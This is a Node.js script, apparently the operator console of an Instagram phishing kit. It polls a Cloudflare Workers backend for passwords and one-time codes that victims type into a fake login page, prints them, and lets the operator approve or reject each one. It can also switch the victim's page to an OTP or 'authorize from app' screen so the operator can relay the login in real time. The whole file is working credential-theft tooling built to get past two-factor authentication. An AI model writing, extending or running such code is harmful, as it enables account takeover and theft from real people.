import readline from 'readline';
import fetch from 'node-fetch';

const API_BASE = 'https://instagram-be.mizerablepi.workers.dev';
const POLL_INTERVAL = 2000;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function askQuestion(query) {
  return new Promise((resolve) => {
    rl.question(query, resolve);
  });
}

async function pollForPassword() {
  console.log('\n🔍 Polling for password...');

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`${API_BASE}/test/cred`);
        const data = await response.json();

        if (data.password && data.password !== '') {
          clearInterval(interval);
          console.log(`\n✅ Password received: ${data.password}`);
          resolve(data.password);
        } else {
          process.stdout.write('.');
        }
      } catch (error) {
        console.error('\n❌ Error polling:', error.message);
      }
    }, POLL_INTERVAL);
  });
}

async function pollForOTP() {
  console.log('\n🔍 Polling for OTP...');

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`${API_BASE}/test/cred`);
        const data = await response.json();

        if (data.otp && data.otp !== '') {
          clearInterval(interval);
          console.log(`\n✅ OTP received: ${data.otp}`);
          resolve(data.otp);
        } else {
          process.stdout.write('.');
        }
      } catch (error) {
        console.error('\n❌ Error polling:', error.message);
      }
    }, POLL_INTERVAL);
  });
}

async function approvePassword(requiredAction = null) {
  try {
    const body = requiredAction ? { required_action: requiredAction } : {};
    const response = await fetch(`${API_BASE}/test/approve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    console.log(`✅ ${data.message}`);
    return true;
  } catch (error) {
    console.error('❌ Error approving:', error.message);
    return false;
  }
}

async function rejectPassword() {
  try {
    const response = await fetch(`${API_BASE}/test/reject`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    const data = await response.json();
    console.log('❌', data.message);
    return true;
  } catch (error) {
    console.error('❌ Error rejecting:', error.message);
    return false;
  }
}

async function approveOTP() {
  try {
    const response = await fetch(`${API_BASE}/test/approve`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    await response.json();
    console.log('✅ OTP approved');
    return true;
  } catch (error) {
    console.error('❌ Error approving OTP:', error.message);
    return false;
  }
}

async function rejectOTP() {
  try {
    const response = await fetch(`${API_BASE}/test/reject`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    await response.json();
    console.log('❌ OTP rejected');
    return true;
  } catch (error) {
    console.error('❌ Error rejecting OTP:', error.message);
    return false;
  }
}

async function resetCredentials() {
  try {
    const response = await fetch(`${API_BASE}/test/reset`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    const data = await response.json();
    console.log('🔄', data.message);
    return true;
  } catch (error) {
    console.error('❌ Error resetting:', error.message);
    return false;
  }
}

async function main() {
  console.log('╔════════════════════════════════════════╗');
  console.log('║   CLI Credential Polling Tool          ║');
  console.log('║   Press Ctrl+C to exit                 ║');
  console.log('╚════════════════════════════════════════╝');

  while (true) {
    const password = await pollForPassword();

    const answer = await askQuestion('\n❓ (n)o, (o)tp, (a)uth: ');

    if (answer.toLowerCase() === 'n') {
      await rejectPassword();
      console.log('\n🔄 Restarting polling...\n');
      continue;
    }

    if (answer.toLowerCase() === 'o' || answer.toLowerCase() === 'a') {
      const actionType = answer.toLowerCase() === 'a' ? 'authorize_app' : 'otp';
      await approvePassword(actionType);

      if (actionType === 'authorize_app') {
        console.log('\n✅ Password approved — frontend will show authorize-from-app screen');
        const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
        if (continuePolling.toLowerCase() !== 'y') {
          console.log('\n👋 Exiting CLI tool...');
          rl.close();
          process.exit(0);
        }
        console.log('\n🔄 Restarting polling...\n');
        continue;
      }

      let otpVerified = false;
      while (!otpVerified) {
        const otp = await pollForOTP();

        const otpAnswer = await askQuestion('\n❓ Is the OTP correct? (y/n): ');

        if (otpAnswer.toLowerCase() === 'n') {
          await rejectOTP();
          console.log('\n🔄 Re-polling for OTP...\n');
        } else if (otpAnswer.toLowerCase() === 'y') {
          await approveOTP();

          console.log('\n✅ OTP verification complete!');
          console.log(`   Password: ${password}`);
          console.log(`   OTP: ${otp}`);

          otpVerified = true;

          const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
          if (continuePolling.toLowerCase() !== 'y') {
            console.log('\n👋 Exiting CLI tool...');
            rl.close();
            process.exit(0);
          }

          console.log('\n🔄 Restarting polling...\n');
        } else {
          console.log('⚠️  Invalid input. Please enter "y" or "n".');
        }
      }
    } else {
      console.log('⚠️  Invalid input. Please enter "y" or "n".');
    }
  }
}

process.on('SIGINT', () => {
  console.log('\n\n👋 Exiting CLI tool...');
  rl.close();
  process.exit(0);
});

main().catch((error) => {
  console.error('❌ Fatal error:', error);
  rl.close();
  process.exit(1);
});
